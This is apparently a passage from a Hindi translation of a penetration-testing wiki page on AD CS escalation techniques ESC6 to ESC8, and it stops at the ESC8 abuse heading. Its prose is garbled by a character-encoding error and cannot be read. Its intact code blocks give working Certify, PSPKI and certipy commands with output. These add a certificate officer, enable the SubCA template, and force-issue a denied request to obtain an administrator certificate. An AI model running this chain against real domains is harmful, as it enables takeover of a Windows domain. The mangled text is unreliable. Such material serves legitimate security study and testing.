**рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреА `objectSid`** рдХреЛ рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд рдХрд░рддреА рд╣реИ, рдФрд░ SAN рд╕реЗ рдирд╣реАрдВред\
рдЗрд╕ рдкреНрд░рдХрд╛рд░, **ESC6 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**, рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЛ **ESC10** (Weak Certificate Mappings) рдХреЗ рдкреНрд░рддрд┐ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**, рдЬрд╣рд╛рдВ **SAN рдХреЛ рдирдП рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдкрд░ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреА рдЬрд╛рддреА рд╣реИ**ред
{% endhint %}

## рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг - ESC7

### рд╣рдорд▓рд╛ 1

#### рд╡реНрдпрд╛рдЦреНрдпрд╛

рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╕реНрд╡рдпрдВ рд╡рд┐рднрд┐рдиреНрди **CA рдХреНрд░рд┐рдпрд╛рдУрдВ** рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдПрдХ рд╕рдореВрд╣** рд░рдЦрддрд╛ рд╣реИред рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ `certsrv.msc` рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, CA рдкрд░ рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ, рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ, рдФрд░ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЯреИрдм рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░рдХреЗ:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕реЗ [**PSPKI рдХреЗ рдореЙрдбреНрдпреВрд▓**](https://www.pkisolutions.com/tools/pspki/) рдХреЗ рд╕рд╛рде `Get-CertificationAuthority | Get-CertificationAuthorityAcl` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдЧрдгрдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **`ManageCA`** рдЕрдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓рд╛ рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рд╣реИ рдЬреЛ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг** рдкрд░ рд╣реИ, рддреЛ рд╣рдо **PSPKI** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ **`EDITF_ATTRIBUTESUBJECTALTNAME2`** рдмрд┐рдЯ рдХреЛ **SAN** рдирд┐рд░реНрджрд┐рд╖реНрдЯреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд▓рдЯ рд╕рдХрддреЗ рд╣реИрдВ ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ [**PSPKI рдХреЗ Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) cmdlet рдХреЗ рд╕рд╛рде рдПрдХ рд╕рд░рд▓ рд░реВрдк рдореЗрдВ рднреА рд╕рдВрднрд╡ рд╣реИред

**`ManageCertificates`** рдЕрдзрд┐рдХрд╛рд░ "CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рдмрдВрдзрдХ рдЕрдиреБрдореЛрджрди" рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдХреЗ **рд▓рдВрдмрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рдордВрдЬреВрд░реА рджреЗрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЖрдк **Certify** рдФрд░ **PSPKI** рдореЙрдбреНрдпреВрд▓ рдХрд╛ **рд╕рдВрдпреЛрдЬрди** рдХрд░рдХреЗ рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдордВрдЬреВрд░реА рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### рд╣рдорд▓рд╛ 2

#### рд╡реНрдпрд╛рдЦреНрдпрд╛

{% hint style="warning" %}
**рдкрд┐рдЫрд▓реЗ рд╣рдорд▓реЗ** рдореЗрдВ **`Manage CA`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **EDITF\_ATTRIBUTESUBJECTALTNAME2** рдлреНрд▓реИрдЧ рдХреЛ **рд╕рдХреНрд╖рдо** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ **ESC6 рд╣рдорд▓рд╛** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд▓реЗрдХрд┐рди рдЬрдм рддрдХ CA рд╕реЗрд╡рд╛ (`CertSvc`) рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛, рддрдм рддрдХ рдЗрд╕рдХрд╛ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЬрдм рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ `Manage CA` рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ **рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рднреА рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХрд╛ рдпрд╣ **рдорддрд▓рдм рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдХреЛ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **ESC6 рдЕрдзрд┐рдХрд╛рдВрд╢ рдкреИрдЪ рдХрд┐рдП рдЧрдП рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рддреБрд░рдВрдд рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛** рдХреНрдпреЛрдВрдХрд┐ рдордИ 2022 рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдХреЗ рдХрд╛рд░рдгред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдпрд╣рд╛рдБ рдПрдХ рдФрд░ рд╣рдорд▓рд╛ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдкреВрд░реНрд╡ рд╢рд░реНрддреЗрдВ:

* рдХреЗрд╡рд▓ **`ManageCA` рдЕрдиреБрдорддрд┐**
* **`Manage Certificates`** рдЕрдиреБрдорддрд┐ (рдЬреЛ **`ManageCA`** рд╕реЗ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **`SubCA`** рдХреЛ **рд╕рдХреНрд╖рдо** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЬрд┐рд╕реЗ **`ManageCA`** рд╕реЗ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)

рдпрд╣ рддрдХрдиреАрдХ рдЗрд╕ рддрдереНрдп рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ рдХрд┐ `Manage CA` _рдФрд░_ `Manage Certificates` рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдЕрд╕рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред **`SubCA`** рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **ESC1 рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ**, рд▓реЗрдХрд┐рди **рдХреЗрд╡рд▓ рдкреНрд░рд╢рд╛рд╕рдХ** рд╣реА рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд╛рдорд╛рдВрдХрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** **`SubCA`** рдореЗрдВ рдирд╛рдорд╛рдВрдХрди рдХреЗ рд▓рд┐рдП **рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ** - рдЬрд┐рд╕реЗ **рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛** - рд▓реЗрдХрд┐рди **рдлрд┐рд░ рдкреНрд░рдмрдВрдзрдХ рджреНрд╡рд╛рд░рд╛ рдмрд╛рдж рдореЗрдВ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

#### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдирдП рдЕрдзрд┐рдХрд╛рд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рдХрд░ **рдЦреБрдж рдХреЛ `Manage Certificates`** рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ CA рдкрд░ `-enable-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `SubCA` рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
рдпрджрд┐ рд╣рдордиреЗ рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╢рд░реНрддреЗрдВ рдкреВрд░реА рдХрд░ рд▓реА рд╣реИрдВ, рддреЛ рд╣рдо **`SubCA` рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдорд╛рдВрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

**рдпрд╣ рдЕрдиреБрд░реЛрдз рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**, рд▓реЗрдХрд┐рди рд╣рдо рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреА рдХреЛ рд╕рд╣реЗрдЬ рд▓реЗрдВрдЧреЗ рдФрд░ рдЕрдиреБрд░реЛрдз ID рдХреЛ рдиреЛрдЯ рдХрд░ рд▓реЗрдВрдЧреЗред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
рд╣рдорд╛рд░реЗ **`Manage CA` рдФрд░ `Manage Certificates`** рдХреЗ рд╕рд╛рде, рд╣рдо рдлрд┐рд░ **рдЕрд╕рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** `ca` рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдФрд░ `-issue-request <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рдеред
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
рдФрд░ рдЕрдВрдд рдореЗрдВ, рд╣рдо `req` рдХрдорд╛рдВрдб рдФрд░ `-retrieve <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints тАУ ESC8

### рд╡реНрдпрд╛рдЦреНрдпрд╛

{% hint style="info" %}
рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдпрджрд┐ рдХрд┐рд╕реА рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ **AD CS рд╕реНрдерд╛рдкрд┐рдд** рд╣реИ, рдПрдХ **рдХрдордЬреЛрд░ рд╡реЗрдм рдирд╛рдорд╛рдВрдХрди рдЕрдВрддрд░рд╛рдкреГрд╖реНрда** рдХреЗ рд╕рд╛рде рдФрд░ рдХрдо рд╕реЗ рдХрдо рдПрдХ **рдкреНрд░рдХрд╛рд╢рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ** рдЬреЛ **рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдорд╛рдВрдХрди рдФрд░ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ **`Machine`** рдЯреЗрдореНрдкрд▓реЗрдЯ), рддреЛ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реЛ**!
{% endhint %}

AD CS рдХрдИ **HTTP-рдЖрдзрд╛рд░рд┐рдд рдирд╛рдорд╛рдВрдХрди рд╡рд┐рдзрд┐рдпреЛрдВ** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдкреНрд░рд╢рд╛рд╕рдХ рдЕрддрд┐рд░рд┐рдХреНрдд AD CS рд╕рд░реНрд╡рд░ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ HTTP-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╛рдорд╛рдВрдХрди рдЗрдВрдЯрд░рдлреЗрд╕ рд╕рднреА **NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╣реИрдВред NTLM рд░рд┐рд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдорд╢реАрди рдкрд░ рдХрд┐рд╕реА рднреА рдЗрдирдмрд╛рдЙрдВрдб-NTLM-рдкреНрд░рдорд╛рдгреАрдХрд░рдг AD рдЦрд╛рддреЗ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╕рдордп, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрди рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **`User` рдпрд╛ `Machine` рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

* **рд╡реЗрдм рдирд╛рдорд╛рдВрдХрди рдЗрдВрдЯрд░рдлреЗрд╕** (рдПрдХ рдкреБрд░рд╛рдиреЗ рджрд┐рдЦрдиреЗ рд╡рд╛рд▓рд╛ ASP рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛ `http://<caserver>/certsrv/` рдкрд░ рд╕реБрд▓рдн рд╣реИ), рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ HTTP рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЕрдкрдиреЗ Authorization HTTP рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЗрд╕рд▓рд┐рдП рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЬреИрд╕реЗ рдХрд┐ Kerberos рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗред
* **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) рд╡реЗрдм рд╕реЗрд╡рд╛, рдФрд░ **Network Device Enrollment Service** (NDES) рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЙрдирдХреЗ Authorization HTTP рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рддрдЪреАрдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред рдмрд╛рддрдЪреАрдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг **Kerberos рдФрд░ NTLM рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ**; рдирддреАрдЬрддрди, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рджреМрд░рд╛рди NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рддрдХ **рдмрд╛рддрдЪреАрдд рдХреЛ рдХрдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдпреЗ рд╡реЗрдм рд╕реЗрд╡рд╛рдПрдБ рдХрдо рд╕реЗ рдХрдо HTTPS рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ HTTPS рдЕрдХреЗрд▓реЗ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рддрд╛ред рдХреЗрд╡рд▓ рдЬрдм HTTPS рдХреЛ рдЪреИрдирд▓ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддрдм рд╣реА HTTPS рд╕реЗрд╡рд╛рдПрдБ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ, AD CS IIS рдкрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЪреИрдирд▓ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред

NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рд╕рд╛рде рд╕рд╛рдорд╛рдиреНрдп **рд╕рдорд╕реНрдпрд╛рдПрдВ** рдпрд╣ рд╣реИрдВ рдХрд┐ **NTLM рд╕рддреНрд░ рдЖрдорддреМрд░ рдкрд░ рдЫреЛрдЯреЗ рд╣реЛрддреЗ рд╣реИрдВ** рдФрд░ рд╣рдорд▓рд╛рд╡рд░ **NTLM рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдирд╣реАрдВ** рдХрд░ рд╕рдХрддрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЗрд╕ рд╕реАрдорд╛рдУрдВ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕рддреНрд░ рддрдм рддрдХ рдЬреАрд╡рд┐рдд рд░рд╣реЗрдЧрд╛ рдЬрдм рддрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреНрдп рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ **NTLM рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЪреБрд░рд╛рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреА рдПрдХ рдФрд░ рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЙрдиреНрд╣реЗрдВ **рд╣рдорд▓рд╛рд╡рд░-рдирд┐рдпрдВрддреНрд░рд┐рдд рдорд╢реАрди рдкрд░ рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ **рдмрд▓** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **рджреБрд░реБрдкрдпреЛрдЧ**

